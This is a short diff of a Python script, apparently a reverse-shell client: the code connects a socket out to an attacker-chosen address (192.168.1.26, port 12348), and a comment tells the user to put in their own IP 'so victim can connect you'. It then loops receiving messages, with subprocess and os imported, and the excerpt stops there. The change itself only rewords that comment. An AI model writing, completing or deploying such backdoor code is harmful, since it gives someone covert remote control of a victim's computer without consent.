@@ -2,7 +2,7 @@ import socket
 import subprocess
 import os
 req = socket.socket()
-req.connect(("192.168.1.26",12348)) #you have to change this ip to ip with your ip adress so victim can connect you
+req.connect(("192.168.1.26",12348)) #you have to change this ip to your ip adress so victim can connect you
 print(socket.gethostname())
 while 1 :
         mesaj = req.recv(1024)
